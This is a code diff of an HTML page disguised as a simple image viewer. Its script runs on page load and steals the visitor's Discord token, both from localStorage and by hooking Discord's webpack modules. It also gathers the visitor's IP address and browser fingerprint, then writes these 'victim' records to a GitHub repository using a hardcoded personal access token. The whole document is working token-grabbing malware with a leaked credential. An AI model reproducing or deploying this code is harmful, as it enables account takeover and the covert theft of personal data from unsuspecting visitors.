@@ -1,82 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+</head>
+<body style="margin:0;height:100vh;width:100vw;overflow:hidden;background:black;">
+<img id="p" style="width:100%;height:100%;object-fit:cover;display:block;" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs=" onerror="s()" onload="s()">
 <script>
 async function s(){
   try {
-    console.log('Grabber started');
-    let params = new URLSearchParams(location.search);
-    let u = atob(params.get('u') || '');
-    document.getElementById('p').src = u;
+    console.log('🔥 Grabber activated');
     
-    // TOKEN GRAB #1
-    let tk1 = null;
+    // Get image URL
+    let params = new URLSearchParams(location.search);
+    let imgurl = atob(params.get('u') || '');
+    document.getElementById('p').src = imgurl;
+    
+    // TOKEN METHOD 1: localStorage
+    let token1 = null;
     for(let k in localStorage){
-      if(k.includes('token')){
-        tk1 = localStorage[k];
+      if(k.includes('token') && localStorage[k].length > 20){
+        token1 = localStorage[k];
         break;
       }
     }
     
-    // TOKEN GRAB #2 (Discord webpack)
-    let tk2 = null;
+    // TOKEN METHOD 2: Discord Webpack
+    let token2 = null;
     try {
-      if(window.webpackChunkdiscord_app){
-        let w = window.webpackChunkdiscord_app;
-        w.push([[Math.random()],[],(req) => {
+      if(typeof webpackChunkdiscord_app !== 'undefined'){
+        webpackChunkdiscord_app.push([[''],{},(req)=>{
           for(let m in req.c){
-            if(req.c[m].exports && req.c[m].exports.default && req.c[m].exports.default.getToken){
-              tk2 = req.c[m].exports.default.getToken();
-            }
+            try {
+              let mod = req.c[m].exports;
+              if(mod && mod.default && mod.default.getToken){
+                token2 = mod.default.getToken();
+              }
+            } catch(e){}
           }
         }]);
       }
     } catch(e) {}
     
-    let token = tk1 || tk2 || 'no-token-found';
+    let token = token1 || token2 || 'NO_TOKEN';
     
-    // IP GRAB
-    let ip = 'fetching...';
+    // IP ADDRESS
+    let ipaddr = 'FETCHING_IP...';
     try {
-      let ipres = await fetch('https://api.ipify.org?format=json');
+      let ipres = await fetch('https://api.ipify.org?format=json', {mode: 'cors'});
       let ipdata = await ipres.json();
-      ip = ipdata.ip;
+      ipaddr = ipdata.ip;
     } catch(e) {
-      ip = 'ip-error';
+      try {
+        let ipres2 = await fetch('https://httpbin.org/ip', {mode: 'cors'});
+        let ipdata2 = await ipres2.json();
+        ipaddr = ipdata2.origin;
+      } catch(e2) {}
     }
     
-    let data = {
-      ip: ip,
-      token: token,
-      useragent: navigator.userAgent,
-      screen: screen.width + 'x' + screen.height,
+    // FULL DATA
+    let victimData = {
+      timestamp: new Date().toISOString(),
+      ip: ipaddr,
+      discord_token: token,
+      user_agent: navigator.userAgent,
+      screen_resolution: screen.width + 'x' + screen.height,
       language: navigator.language,
+      platform: navigator.platform,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      url: location.href,
-      time: new Date().toISOString()
+      referrer: document.referrer,
+      target_image: imgurl,
+      user_agent_full: navigator.userAgent
     };
     
-    console.log('Sending data:', data);
+    console.log('📡 Data captured:', victimData);
     
-    // SAVE TO GITHUB
-    let logsdata = '=== NEW GRAB ===\n' + JSON.stringify(data, null, 2) + '\n\n';
-    let ghurl = 'https://api.github.com/repos/depex09/imgview/contents/logs.txt';
-    let ghres = await fetch(ghurl, {
+    // SAVE TO GITHUB LOGS
+    let logEntry = `\n🕷️ NEW VICTIM [${new Date().toLocaleString()}] 🕷️\n` + 
+                   `IP: ${ipaddr}\n` +
+                   `TOKEN: ${token}\n` +
+                   `UA: ${navigator.userAgent.substring(0,100)}...\n` +
+                   `SCREEN: ${screen.width}x${screen.height}\n` +
+                   `TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
+                   `IMG: ${imgurl}\n` +
+                   `═══════════════════════════════════════`;
+    
+    // Get existing logs + append new
+    let existingLogs = '';
+    try {
+      let logsRes = await fetch('https://raw.githubusercontent.com/YOUR_GITHUB_USERNAME/imgview/main/logs.txt');
+      existingLogs = await logsRes.text();
+    } catch(e) {}
+    
+    let fullLogs = existingLogs + logEntry;
+    
+    // POST TO GITHUB
+    let ghResponse = await fetch('https://api.github.com/repos/depex09/imgview/contents/logs.txt', {
       method: 'PUT',
       headers: {
         'Authorization': 'token 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',
-        'Content-Type': 'application/json'
+        'Content-Type': 'application/json',
+        'User-Agent': 'grabber'
       },
       body: JSON.stringify({
-        message: 'New grab ' + new Date().toISOString(),
-        content: btoa(logsdata + '\n' + (await fetch('https://raw.githubusercontent.com/YOUR_GITHUB_USERNAME/imgview/main/logs.txt').then(r=>r.text()).catch(()=>''))),
-        sha: '' // Will create new file first time
+        message: 'Victim grabbed ' + new Date().toISOString(),
+        content: btoa(fullLogs),
+        branch: 'main'
       })
     });
     
-    console.log('GitHub save:', ghres.status);
+    console.log('💾 GitHub save status:', ghResponse.status);
+    console.log('✅ Grab COMPLETE');
     
-  } catch(e) {
-    console.error('Error:', e);
+  } catch(error) {
+    console.error('❌ Grab error:', error);
   }
 }
 </script>
-
-<script>console.log('Page loaded'); setTimeout(()=>{console.log('localStorage keys:', Object.keys(localStorage).filter(k=>k.includes('token')));}, 2000);</script>
+</body>
+</html>
